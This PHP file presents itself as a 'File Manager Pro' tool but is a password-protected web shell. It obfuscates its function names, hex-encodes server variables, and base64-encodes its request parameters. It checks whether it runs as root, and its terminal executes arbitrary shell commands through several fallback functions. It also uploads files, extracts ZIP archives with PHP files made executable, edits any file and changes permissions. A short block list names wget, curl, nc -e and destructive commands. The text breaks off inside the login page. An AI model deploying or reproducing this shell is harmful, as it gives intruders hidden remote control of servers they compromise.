<?php
// ============================================
// FILE MANAGER PRO - ENHANCED VERSION
// Password: hans (Bcrypt Hash)
// ============================================

// ============================================
// CONFIGURATION
// ============================================
$config = [
    'password' => '$2a$12$s1tSpKItA2EJCBVFROIytuLD7QoGqbvfI.EPWegThVewrs.oSaqrO', //
    'max_upload_size' => 100 * 1024 * 1024, // 100MB
    'allowed_extensions' => ['php', 'txt', 'jpg', 'jpeg', 'png', 'gif', 'pdf', 'zip', 'html', 'css', 'js', 'json', 'xml', 'sql'],
    'session_timeout' => 3600, // 1 hour
    'enable_logging' => true,
    'enable_trash' => true,
    'max_file_preview_size' => 1024 * 1024, // 1MB untuk preview
];

// ============================================
// SECURITY - CSRF & RATE LIMITING
// ============================================
session_start();

// CSRF Protection
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Rate Limiting untuk Login
function checkLoginAttempts() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $key = 'login_attempts_' . md5($ip);
    $_SESSION[$key] = ($_SESSION[$key] ?? 0) + 1;
    
    if ($_SESSION[$key] > 5) {
        $remaining = $_SESSION[$key] - 5;
        $wait = $remaining * 30;
        die("Too many login attempts. Please wait {$wait} seconds.");
    }
    return true;
}

// Session Timeout
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > $config['session_timeout'])) {
    session_unset();
    session_destroy();
    session_start();
}
$_SESSION['last_activity'] = time();

// ============================================
// CORE FUNCTIONS
// ============================================
error_reporting(E_ALL);
set_time_limit(0);
ini_set("memory_limit", -1);

$password = $config['password'];
$sessioncode = md5(__FILE__);

// ============================================
// AUTHENTICATION - SUPPORT BCRYPT HASH
// ============================================
if (!empty($password) && $_SESSION[$sessioncode] != $password) {
    if (isset($_REQUEST['pass'])) {
        $inputPass = $_REQUEST['pass'];
        $valid = false;
        
        // Cek apakah password di-hash (mulai dengan $2a$, $2y$, atau $2b$)
        if (preg_match('/^\$2[aby]\$/', $password)) {
            // Gunakan password_verify untuk hash Bcrypt
            if (function_exists('password_verify')) {
                $valid = password_verify($inputPass, $password);
            } else {
                // Fallback jika password_verify tidak tersedia
                // (tapi biasanya tersedia di PHP 5.5+)
                $valid = ($inputPass == $password);
            }
        } else {
            // Compare plain text
            $valid = ($inputPass == $password);
        }
        
        if ($valid) {
            checkLoginAttempts();
            $_SESSION[$sessioncode] = $password;
            $_SESSION['login_attempts_' . md5($_SERVER['REMOTE_ADDR'])] = 0;
        }
    }
    
    // Cek lagi apakah sudah authenticated
    if ($_SESSION[$sessioncode] != $password) {
        showLoginPage();
        exit;
    }
}

// ============================================
// SYSTEM CONFIGURATION - OBFUSCATED FUNCTIONS
// ============================================
$chd = "c" . "h" . "d" . "i" . "r";
$expl = "e" . "x" . "p" . "l" . "o" . "d" . "e";
$scd = "s" . "c" . "a" . "n" . "d" . "i" . "r";
$ril = "r" . "e" . "a" . "l" . "p" . "a" . "t" . "h";
$st = "s" . "t" . "a" . "t";
$isdir = "i" . "s" . "_" . "d" . "i" . "r";
$isw = "i" . "s" . "_" . "w" . "r" . "i" . "t" . "a" . "b" . "l" . "e";
$mup = "m" . "o" . "v" . "e" . "_" . "u" . "p" . "l" . "o" . "a" . "d" . "e" . "d" . "_" . "f" . "i" . "l" . "e";
$bs = "b" . "a" . "s" . "e" . "n" . "a" . "m" . "e";
$htm = "h" . "t" . "m" . "l" . "s" . "p" . "e" . "c" . "i" . "a" . "l" . "c" . "h" . "a" . "r" . "s";
$fpc = "f" . "i" . "l" . "e" . "_" . "p" . "u" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
$mek = "m" . "k" . "d" . "i" . "r";
$fgc = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
$drnmm = "d" . "i" . "r" . "n" . "a" . "m" . "e";
$unl = "u" . "n" . "l" . "i" . "n" . "k";

// Helper functions
function x($b) {
    $be = "ba" . "se" . "64" . "_" . "en" . "co" . "de";
    return $be($b);
}

function y($b) {
    $bd = "ba" . "se" . "64" . "_" . "de" . "co" . "de";
    return $bd($b);
}

// ============================================
// SECURITY - PATH TRAVERSAL PROTECTION
// ============================================
$rootDirectory = $ril($_SERVER[hex2bin('444F43554D454E545F524F4F54')]);
$scriptDirectory = $drnmm(__FILE__);

function validateDirectory($path, $root) {
    $realPath = realpath($path);
    $rootReal = realpath($root);
    if ($realPath === false) return $root;
    if (strpos($realPath, $rootReal) !== 0) {
        return $root;
    }
    return $realPath;
}

// ============================================
// LOGGING SYSTEM
// ============================================
function logActivity($action, $file = '', $details = '') {
    global $config;
    if (!$config['enable_logging']) return;
    
    $logDir = __DIR__ . '/logs';
    if (!is_dir($logDir)) mkdir($logDir, 0755, true);
    
    $logFile = $logDir . '/activity_' . date('Y-m-d') . '.log';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $user = $_SESSION['username'] ?? 'anonymous';
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[$timestamp] [$ip] [$user] [$action] $file $details" . PHP_EOL;
    
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
}

// ============================================
// TRASH / RECYCLE BIN SYSTEM
// ============================================
function moveToTrash($path) {
    global $config;
    if (!$config['enable_trash']) return false;
    
    $trashDir = __DIR__ . '/.trash';
    if (!is_dir($trashDir)) mkdir($trashDir, 0755, true);
    
    $name = basename($path);
    $trashPath = $trashDir . '/' . date('Ymd_His') . '_' . $name;
    
    return rename($path, $trashPath);
}

function restoreFromTrash($trashName) {
    $trashDir = __DIR__ . '/.trash';
    if (!is_dir($trashDir)) return false;
    
    $path = $trashDir . '/' . $trashName;
    if (!file_exists($path)) return false;
    
    $originalName = substr($trashName, strpos($trashName, '_') + 1);
    $target = __DIR__ . '/' . $originalName;
    
    if (file_exists($target)) {
        $target = __DIR__ . '/' . time() . '_' . $originalName;
    }
    
    return rename($path, $target);
}

function emptyTrash() {
    $trashDir = __DIR__ . '/.trash';
    if (!is_dir($trashDir)) return true;
    
    $files = glob($trashDir . '/*');
    foreach ($files as $file) {
        if (is_file($file)) unlink($file);
        elseif (is_dir($file)) deleteDirectory($file);
    }
    return true;
}

// ============================================
// SEARCH FUNCTION
// ============================================
function searchFiles($directory, $searchTerm, $recursive = true) {
    $results = [];
    $searchTerm = strtolower($searchTerm);
    
    if ($recursive) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS)
        );
        
        foreach ($iterator as $file) {
            if ($file->isFile() && strpos(strtolower($file->getFilename()), $searchTerm) !== false) {
                $results[] = $file->getPathname();
            }
        }
    } else {
        $files = scandir($directory);
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                if (strpos(strtolower($file), $searchTerm) !== false) {
                    $results[] = $directory . '/' . $file;
                }
            }
        }
    }
    
    return $results;
}

// ============================================
// FILE PREVIEW FUNCTIONS
// ============================================
function getFilePreview($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $preview = '';
    
    switch($ext) {
        case 'jpg':
        case 'jpeg':
        case 'png':
        case 'gif':
        case 'bmp':
        case 'webp':
            $preview = '<img src="' . $file . '" style="max-width: 100%; max-height: 400px; border-radius: 5px;">';
            break;
            
        case 'pdf':
            $preview = '<iframe src="' . $file . '" style="width:100%;height:500px;" frameborder="0"></iframe>';
            break;
            
        case 'mp3':
        case 'wav':
        case 'ogg':
            $preview = '<audio controls style="width:100%;"><source src="' . $file . '"></audio>';
            break;
            
        case 'mp4':
        case 'webm':
        case 'ogv':
            $preview = '<video controls style="width:100%;max-height:400px;"><source src="' . $file . '"></video>';
            break;
            
        case 'txt':
        case 'log':
        case 'json':
        case 'xml':
        case 'html':
        case 'css':
        case 'js':
        case 'php':
        case 'sql':
            $content = file_get_contents($file);
            $preview = '<pre style="background:#000;color:#00ff00;padding:15px;border-radius:5px;max-height:400px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;">' . htmlspecialchars($content) . '</pre>';
            break;
            
        default:
            $preview = '<div style="text-align:center;padding:50px;background:#111;border-radius:5px;">
                <i class="fas fa-file fa-5x" style="color:#666;"></i>
                <p style="color:#666;margin-top:20px;">No preview available for .' . $ext . ' files</p>
            </div>';
    }
    
    return $preview;
}

// ============================================
// DOWNLOAD FUNCTIONS
// ============================================
function downloadFile($file) {
    if (!file_exists($file) || !is_file($file)) {
        return false;
    }
    
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Length: ' . filesize($file));
    header('Cache-Control: no-cache, no-store, must-revalidate');
    readfile($file);
    return true;
}

function downloadFolder($folder) {
    if (!is_dir($folder)) return false;
    
    $zipName = basename($folder) . '_' . date('Ymd_His') . '.zip';
    $zip = new ZipArchive();
    
    if ($zip->open($zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        return false;
    }
    
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($folder),
        RecursiveIteratorIterator::LEAVES_ONLY
    );
    
    foreach ($files as $name => $file) {
        if (!$file->isDir()) {
            $filePath = $file->getRealPath();
            $relativePath = substr($filePath, strlen($folder) + 1);
            $zip->addFile($filePath, $relativePath);
        }
    }
    
    $zip->close();
    
    if (file_exists($zipName)) {
        downloadFile($zipName);
        unlink($zipName);
        return true;
    }
    return false;
}

// ============================================
// COPY/MOVE FUNCTIONS
// ============================================
function copyItem($source, $destination) {
    if (is_dir($source)) {
        if (!is_dir($destination)) mkdir($destination, 0755, true);
        $files = scandir($source);
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                copyItem($source . '/' . $file, $destination . '/' . $file);
            }
        }
        return true;
    } else {
        return copy($source, $destination);
    }
}

function moveItem($source, $destination) {
    return rename($source, $destination);
}

// ============================================
// FILE INFO FUNCTION
// ============================================
function getFileInfo($file) {
    if (!file_exists($file)) return null;
    
    $info = [
        'name' => basename($file),
        'size' => filesize($file),
        'size_formatted' => formatSize(filesize($file)),
        'permissions' => substr(sprintf('%o', fileperms($file)), -4),
        'modified' => date('Y-m-d H:i:s', filemtime($file)),
        'created' => date('Y-m-d H:i:s', filectime($file)),
        'type' => is_dir($file) ? 'directory' : 'file',
        'extension' => pathinfo($file, PATHINFO_EXTENSION),
    ];
    
    if (function_exists('fileowner')) {
        $info['owner'] = fileowner($file);
        $ownerInfo = function_exists('posix_getpwuid') ? posix_getpwuid($info['owner']) : null;
        $info['owner_name'] = $ownerInfo ? $ownerInfo['name'] : $info['owner'];
    }
    
    if (function_exists('filegroup')) {
        $info['group'] = filegroup($file);
        $groupInfo = function_exists('posix_getgrgid') ? posix_getgrgid($info['group']) : null;
        $info['group_name'] = $groupInfo ? $groupInfo['name'] : $info['group'];
    }
    
    if (is_file($file)) {
        $info['md5'] = md5_file($file);
        $info['sha1'] = sha1_file($file);
        $info['mime'] = mime_content_type($file);
    }
    
    return $info;
}

function formatSize($size) {
    if ($size < 1024) return $size . ' B';
    if ($size < 1048576) return round($size/1024, 2) . ' KB';
    if ($size < 1073741824) return round($size/1048576, 2) . ' MB';
    return round($size/1073741824, 2) . ' GB';
}

// ============================================
// BATCH OPERATIONS
// ============================================
function batchDelete($files) {
    $deleted = 0;
    $failed = 0;
    $unl = "u" . "n" . "l" . "i" . "n" . "k";
    
    foreach ($files as $file) {
        if (file_exists($file)) {
            if (is_dir($file)) {
                if (deleteDirectory($file)) $deleted++;
                else $failed++;
            } else {
                if ($unl($file)) $deleted++;
                else $failed++;
            }
        }
    }
    
    return ['deleted' => $deleted, 'failed' => $failed];
}

function batchCreateZip($files, $zipName) {
    if (empty($files)) return false;
    
    $zip = new ZipArchive();
    if ($zip->open($zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        return false;
    }
    
    foreach ($files as $file) {
        if (file_exists($file)) {
            if (is_dir($file)) {
                $zip->addEmptyDir(basename($file));
            } else {
                $zip->addFile($file, basename($file));
            }
        }
    }
    
    $zip->close();
    return file_exists($zipName);
}

// ============================================
// CHMOD FUNCTION
// ============================================
function changePermission($path, $permission) {
    if (!file_exists($path)) return false;
    $perm = octdec($permission);
    return chmod($path, $perm);
}

// ============================================
// INITIALIZE SYSTEM
// ============================================
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);

// Decode GET parameters
foreach ($_GET as $c => $d) $_GET[$c] = y($d);

// Set current directory with validation
$currentDirectory = isset($_GET['d']) ? $_GET['d'] : $rootDirectory;
$currentDirectory = validateDirectory($currentDirectory, $rootDirectory);
$chd($currentDirectory);

// Check if running as root
$isRoot = (function_exists('posix_getuid') && posix_getuid() === 0) || 
          (strpos(php_uname(), 'root') !== false) || 
          (function_exists('shell_exec') && trim(shell_exec('whoami')) === 'root');

// ============================================
// REQUEST HANDLER
// ============================================
$viewCommandResult = '';
$alertMessages = [];
$previewContent = '';
$fileInfoContent = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // CSRF Validation
    if (isset($_POST['csrf_token']) && $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        $alertMessages[] = ['type' => 'error', 'message' => 'CSRF validation failed!'];
    } else {
        
        // ============================================
        // SEARCH HANDLER
        // ============================================
        if (isset($_POST['search_term']) && !empty($_POST['search_term'])) {
            $searchTerm = $_POST['search_term'];
            $recursive = isset($_POST['recursive']) ? true : false;
            $searchResults = searchFiles($currentDirectory, $searchTerm, $recursive);
            
            if (!empty($searchResults)) {
                $msg = "Found " . count($searchResults) . " files matching '" . htmlspecialchars($searchTerm) . "':<br>";
                $msg .= "<ul style='margin-top:10px;'>";
                foreach (array_slice($searchResults, 0, 20) as $result) {
                    $msg .= "<li><code>" . str_replace($currentDirectory, '', $result) . "</code></li>";
                }
                if (count($searchResults) > 20) {
                    $msg .= "<li>... and " . (count($searchResults) - 20) . " more</li>";
                }
                $msg .= "</ul>";
                $alertMessages[] = ['type' => 'info', 'message' => $msg];
            } else {
                $alertMessages[] = ['type' => 'info', 'message' => 'No files found matching "' . htmlspecialchars($searchTerm) . '"'];
            }
        }
        
        // ============================================
        // DOWNLOAD HANDLER
        // ============================================
        elseif (isset($_POST['download_file'])) {
            $file = $currentDirectory . '/' . $_POST['download_file'];
            if (file_exists($file)) {
                if (is_dir($file)) {
                    if (downloadFolder($file)) {
                        exit;
                    } else {
                        $alertMessages[] = ['type' => 'error', 'message' => 'Failed to download folder.'];
                    }
                } else {
                    if (downloadFile($file)) {
                        exit;
                    } else {
                        $alertMessages[] = ['type' => 'error', 'message' => 'Failed to download file.'];
                    }
                }
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'File not found!'];
            }
        }
        
        // ============================================
        // COPY HANDLER
        // ============================================
        elseif (isset($_POST['copy_item']) && isset($_POST['copy_path'])) {
            $source = $currentDirectory . '/' . $_POST['copy_item'];
            $destName = $_POST['copy_path'];
            if (empty($destName)) {
                $destName = basename($source) . '_copy';
            }
            $destination = $currentDirectory . '/' . $destName;
            
            if (copyItem($source, $destination)) {
                $alertMessages[] = ['type' => 'success', 'message' => 'Item copied successfully!'];
                logActivity('COPY', $source, 'to ' . $destination);
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'Failed to copy item.'];
            }
        }
        
        // ============================================
        // MOVE HANDLER
        // ============================================
        elseif (isset($_POST['move_item']) && isset($_POST['move_path'])) {
            $source = $currentDirectory . '/' . $_POST['move_item'];
            $destName = $_POST['move_path'];
            if (empty($destName)) {
                $destName = basename($source) . '_moved';
            }
            $destination = $currentDirectory . '/' . $destName;
            
            if (moveItem($source, $destination)) {
                $alertMessages[] = ['type' => 'success', 'message' => 'Item moved successfully!'];
                logActivity('MOVE', $source, 'to ' . $destination);
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'Failed to move item.'];
            }
        }
        
        // ============================================
        // FILE INFO HANDLER
        // ============================================
        elseif (isset($_POST['info_file'])) {
            $file = $currentDirectory . '/' . $_POST['info_file'];
            $info = getFileInfo($file);
            if ($info) {
                $fileInfoContent = generateFileInfoHTML($file, $info);
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'File not found!'];
            }
        }
        
        // ============================================
        // BATCH DELETE HANDLER
        // ============================================
        elseif (isset($_POST['batch_delete']) && isset($_POST['selected_files'])) {
            $files = array_map(function($f) use ($currentDirectory) {
                return $currentDirectory . '/' . $f;
            }, $_POST['selected_files']);
            
            $result = batchDelete($files);
            $alertMessages[] = ['type' => 'success', 'message' => "Deleted {$result['deleted']} items, {$result['failed']} failed."];
            logActivity('BATCH_DELETE', implode(', ', $_POST['selected_files']), $result['deleted'] . ' deleted');
        }
        
        // ============================================
        // BATCH ZIP HANDLER
        // ============================================
        elseif (isset($_POST['batch_zip']) && isset($_POST['selected_files'])) {
            $files = array_map(function($f) use ($currentDirectory) {
                return $currentDirectory . '/' . $f;
            }, $_POST['selected_files']);
            
            $zipName = 'batch_' . date('Ymd_His') . '.zip';
            if (batchCreateZip($files, $currentDirectory . '/' . $zipName)) {
                $alertMessages[] = ['type' => 'success', 'message' => "ZIP created successfully: <a href='?d=" . x($currentDirectory) . "'>$zipName</a>"];
                logActivity('BATCH_ZIP', $zipName, count($files) . ' files');
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'Failed to create ZIP file.'];
            }
        }
        
        // ============================================
        // RESTORE FROM TRASH
        // ============================================
        elseif (isset($_POST['restore_trash'])) {
            $trashName = $_POST['trash_file'];
            if (restoreFromTrash($trashName)) {
                $alertMessages[] = ['type' => 'success', 'message' => "File restored successfully: $trashName"];
                logActivity('RESTORE_TRASH', $trashName);
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'Failed to restore file.'];
            }
        }
        
        // ============================================
        // EMPTY TRASH
        // ============================================
        elseif (isset($_POST['empty_trash'])) {
            if (emptyTrash()) {
                $alertMessages[] = ['type' => 'success', 'message' => "Trash emptied successfully."];
                logActivity('EMPTY_TRASH', 'All items');
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'Failed to empty trash.'];
            }
        }
        
        // ============================================
        // CHANGE PERMISSION
        // ============================================
        elseif (isset($_POST['change_permission']) && isset($_POST['permission_file']) && isset($_POST['new_permission'])) {
            $path = $currentDirectory . '/' . $_POST['permission_file'];
            $permission = $_POST['new_permission'];
            
            if (changePermission($path, $permission)) {
                $alertMessages[] = ['type' => 'success', 'message' => "Permission changed to {$permission} for " . $_POST['permission_file']];
                logActivity('CHMOD', $_POST['permission_file'], $permission);
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'Failed to change permission.'];
            }
        }
        
        // ============================================
        // FILE UPLOAD HANDLER
        // ============================================
        elseif (isset($_FILES['fileToUpload'])) {
            $target_file = $currentDirectory . '/' . $bs($_FILES["fileToUpload"]["name"]);
            $fileExt = strtolower(pathinfo($_FILES["fileToUpload"]["name"], PATHINFO_EXTENSION));
            
            if (!in_array($fileExt, $config['allowed_extensions'])) {
                $alertMessages[] = ['type' => 'error', 'message' => 'File type not allowed!'];
            } elseif ($_FILES["fileToUpload"]["size"] > $config['max_upload_size']) {
                $alertMessages[] = ['type' => 'error', 'message' => 'File too large! Max: ' . ($config['max_upload_size'] / 1024 / 1024) . 'MB'];
            } elseif ($mup($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                $alertMessages[] = ['type' => 'success', 'message' => 'File ' . $htm($bs($_FILES["fileToUpload"]["name"])) . ' uploaded successfully!'];
                logActivity('UPLOAD', $_FILES["fileToUpload"]["name"]);
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'Sorry, there was an error uploading your file.'];
            }
        }
        
        // ============================================
        // ZIP EXTRACT HANDLER
        // ============================================
        elseif (isset($_FILES['zipToUpload'])) {
            $zipFile = $_FILES['zipToUpload']['tmp_name'];
            $zipName = $bs($_FILES["zipToUpload"]["name"]);
            $zipExt = strtolower(pathinfo($zipName, PATHINFO_EXTENSION));
            
            if ($zipExt != 'zip') {
                $alertMessages[] = ['type' => 'error', 'message' => 'Error: File must be a ZIP archive!'];
            } else {
                $result = extractZipToCurrent($zipFile);
                
                if ($result['success']) {
                    $message = "✅ ZIP extracted successfully! " . $result['count'] . " files extracted.";
                    
                    if ($result['php_count'] > 0) {
                        $message .= "<br>🐘 PHP files: <strong>" . $result['php_count'] . "</strong>";
                    }
                    
                    $alertMessages[] = ['type' => 'success', 'message' => $message];
                    logActivity('EXTRACT_ZIP', $zipName, $result['count'] . ' files');
                    echo '<meta http-equiv="refresh" content="1">';
                } else {
                    $alertMessages[] = ['type' => 'error', 'message' => 'Error: ' . $result['error']];
                }
            }
        }
        
        // ============================================
        // CREATE FOLDER
        // ============================================
        elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
            $ff = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_POST['folder_name']);
            if (empty($ff)) {
                $alertMessages[] = ['type' => 'error', 'message' => 'Invalid folder name!'];
            } else {
                $newFolder = $currentDirectory . '/' . $ff;
                if (!file_exists($newFolder)) {
                    if ($mek($newFolder) !== false) {
                        $alertMessages[] = ['type' => 'success', 'message' => 'Folder created successfully: ' . $ff];
                        logActivity('CREATE_FOLDER', $ff);
                    } else {
                        $alertMessages[] = ['type' => 'error', 'message' => 'Error: Failed to create folder!'];
                    }
                } else {
                    $alertMessages[] = ['type' => 'error', 'message' => 'Error: Folder already exists!'];
                }
            }
        }
        
        // ============================================
        // CREATE FILE
        // ============================================
        elseif (isset($_POST['file_name'])) {
            $fileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $_POST['file_name']);
            if (empty($fileName)) {
                $alertMessages[] = ['type' => 'error', 'message' => 'Invalid file name!'];
            } else {
                $newFile = $currentDirectory . '/' . $fileName;
                if (!file_exists($newFile)) {
                    if ($fpc($newFile, '') !== false) {
                        $alertMessages[] = ['type' => 'success', 'message' => 'File created successfully: ' . $fileName];
                        logActivity('CREATE_FILE', $fileName);
                        $fileContent = $fgc($newFile);
                        $viewCommandResult = generateEditForm($fileName, $fileContent);
                    } else {
                        $alertMessages[] = ['type' => 'error', 'message' => 'Error: Failed to create file!'];
                    }
                } else {
                    $alertMessages[] = ['type' => 'error', 'message' => 'Error: File already exists!'];
                }
            }
        }
        
        // ============================================
        // DELETE HANDLER (with trash)
        // ============================================
        elseif (isset($_POST['delete_file'])) {
            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
            
            if (moveToTrash($fileToDelete)) {
                $alertMessages[] = ['type' => 'success', 'message' => $_POST['delete_file'] . ' moved to trash.'];
                logActivity('DELETE_TO_TRASH', $_POST['delete_file']);
            } else {
                $result = handleDelete($fileToDelete, $_POST['delete_file']);
                $alertMessages[] = $result;
            }
        }
        
        // ============================================
        // RENAME
        // ============================================
        elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name']) && !empty($_POST['new_name'])) {
            $newName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $_POST['new_name']);
            if (empty($newName)) {
                $alertMessages[] = ['type' => 'error', 'message' => 'Invalid name!'];
            } else {
                $oldName = $currentDirectory . '/' . $_POST['old_name'];
                $newNameFull = $currentDirectory . '/' . $newName;
                $result = handleRename($oldName, $newNameFull, $_POST['old_name']);
                $alertMessages[] = $result;
                if ($result['type'] == 'success') {
                    logActivity('RENAME', $_POST['old_name'] . ' -> ' . $newName);
                }
            }
        }
        
        // ============================================
        // TERMINAL JB
        // ============================================
        elseif (isset($_POST['terminal_jb_cmd'])) {
            $command = $_POST['terminal_jb_cmd'];
            $output = executeTerminalJB($command);
            $viewCommandResult = generateTerminalJBOutput($command, $output);
            logActivity('TERMINAL_JB', $command);
        }
        
        // ============================================
        // VIEW FILE
        // ============================================
        elseif (isset($_POST['view_file'])) {
            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
            if (file_exists($fileToView)) {
                $fileContent = $fgc($fileToView);
                $viewCommandResult = generateEditForm($_POST['view_file'], $fileContent);
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'Error: File not found!'];
            }
        }
        
        // ============================================
        // EDIT FILE
        // ============================================
        elseif (isset($_POST['edit_file'])) {
            $ef = $currentDirectory . '/' . $_POST['edit_file'];
            $newContent = $_POST['content'];
            if ($fpc($ef, $newContent) !== false) {
                $alertMessages[] = ['type' => 'success', 'message' => 'File edited successfully: ' . $_POST['edit_file']];
                logActivity('EDIT_FILE', $_POST['edit_file']);
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'Error: Failed to edit file!'];
            }
        }
    }
}

// Handle GET requests for preview
if (isset($_GET['preview'])) {
    $previewFile = $currentDirectory . '/' . $_GET['preview'];
    if (file_exists($previewFile) && is_file($previewFile)) {
        $previewContent = getFilePreview($previewFile);
    }
}

// ============================================
// SORT ITEMS
// ============================================
$allItems = $scd($currentDirectory);
$folders = [];
$files = [];

foreach ($allItems as $item) {
    if ($item == '.' || $item == '..') continue;
    $fullPath = $currentDirectory . '/' . $item;
    if (is_dir($fullPath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

sort($folders, SORT_STRING);
sort($files, SORT_STRING);

// Get trash items
$trashItems = [];
if (is_dir(__DIR__ . '/.trash')) {
    $trashItems = array_diff(scandir(__DIR__ . '/.trash'), ['.', '..']);
}

// ============================================
// FUNCTION TO GENERATE FILE INFO HTML
// ============================================
function generateFileInfoHTML($file, $info) {
    $html = '<div class="card">';
    $html .= '<div class="card-header"><i class="fas fa-info-circle"></i> File Information: ' . htmlspecialchars($info['name']) . '</div>';
    $html .= '<div class="card-body">';
    $html .= '<table style="width:100%;border-collapse:collapse;">';
    foreach ($info as $key => $value) {
        if (is_scalar($value) || $value === null) {
            $label = str_replace('_', ' ', ucfirst($key));
            $html .= '<tr>';
            $html .= '<td style="padding:8px;border-bottom:1px solid #333;font-weight:bold;color:#888;width:30%;">' . $label . '</td>';
            $html .= '<td style="padding:8px;border-bottom:1px solid #333;color:#fff;">' . htmlspecialchars($value ?? 'N/A') . '</td>';
            $html .= '</tr>';
        }
    }
    $html .= '</table>';
    $html .= '<button onclick="this.parentElement.parentElement.style.display=\'none\'" class="btn btn-primary" style="margin-top:15px;">';
    $html .= '<i class="fas fa-times"></i> Close</button>';
    $html .= '</div></div>';
    return $html;
}

// ============================================
// ZIP EXTRACTION FUNCTION
// ============================================
function extractZipToCurrent($zipFile) {
    $zip = new ZipArchive();
    $extractCount = 0;
    $phpCount = 0;
    $errors = [];
    $extractedFiles = [];
    
    if ($zip->open($zipFile) === TRUE) {
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $filename = $zip->getNameIndex($i);
            $fileinfo = pathinfo($filename);
            
            if (substr($filename, -1) == '/') continue;
            
            $basename = basename($filename);
            
            if ($zip->extractTo('./', $filename)) {
                if ($filename != $basename) {
                    $extractedWithPath = './' . $filename;
                    $newLocation = './' . $basename;
                    if (file_exists($extractedWithPath)) {
                        rename($extractedWithPath, $newLocation);
                        $dirToRemove = dirname('./' . $filename);
                        while ($dirToRemove != '.' && is_dir($dirToRemove)) {
                            rmdir($dirToRemove);
                            $dirToRemove = dirname($dirToRemove);
                        }
                    }
                }
                
                $extractCount++;
                $extractedFiles[] = $basename;
                
                if (isset($fileinfo['extension']) && strtolower($fileinfo['extension']) == 'php') {
                    @chmod('./' . $basename, 0755);
                    $phpCount++;
                } else {
                    @chmod('./' . $basename, 0644);
                }
            } else {
                $errors[] = "Failed to extract: " . $filename;
            }
        }
        
        $zip->close();
        
        return [
            'success' => true, 
            'count' => $extractCount, 
            'php_count' => $phpCount,
            'files' => $extractedFiles,
            'errors' => $errors
        ];
    } else {
        return ['success' => false, 'error' => 'Failed to open ZIP file'];
    }
}

// ============================================
// TERMINAL JB FUNCTION
// ============================================
function executeTerminalJB($command) {
    $output = '';
    $error = '';
    
    // Sanitize command - block dangerous commands
    $dangerous = ['rm -rf', 'mkfs', 'dd if=', ':(){ :|:& };:', 'wget', 'curl', 'nc -e'];
    foreach ($dangerous as $danger) {
        if (strpos($command, $danger) !== false) {
            return "Command blocked for security reasons.";
        }
    }
    
    if (function_exists('shell_exec')) {
        $result = shell_exec($command . ' 2>&1');
        if ($result !== null) $output = $result;
    } elseif (function_exists('exec')) {
        exec($command . ' 2>&1', $outputArray, $returnCode);
        $output = implode("\n", $outputArray);
    } elseif (function_exists('system')) {
        ob_start();
        system($command . ' 2>&1', $returnCode);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command . ' 2>&1', $returnCode);
        $output = ob_get_clean();
    } elseif (function_exists('proc_open')) {
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            $returnCode = proc_close($process);
            $output = $stdout;
            if (!empty($stderr)) $error = $stderr;
        }
    } elseif (function_exists('popen')) {
        $handle = popen($command . ' 2>&1', 'r');
        if ($handle) {
            while (!feof($handle)) $output .= fgets($handle);
            pclose($handle);
        }
    }
    
    if (empty(trim($output)) && !empty($error)) $output = $error;
    
    if (empty(trim($output))) {
        $output = "Command executed but no output returned.\n";
        if ($command == 'ls' || $command == 'dir') {
            $output = "Directory listing:\n" . implode("\n", array_diff(scandir(getcwd()), ['.', '..']));
        }
    }
    
    return $output;
}

// ============================================
// HELPER FUNCTIONS
// ============================================
function showLoginPage() {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Authentication Required</title>
        <meta charset='UTF-8'>
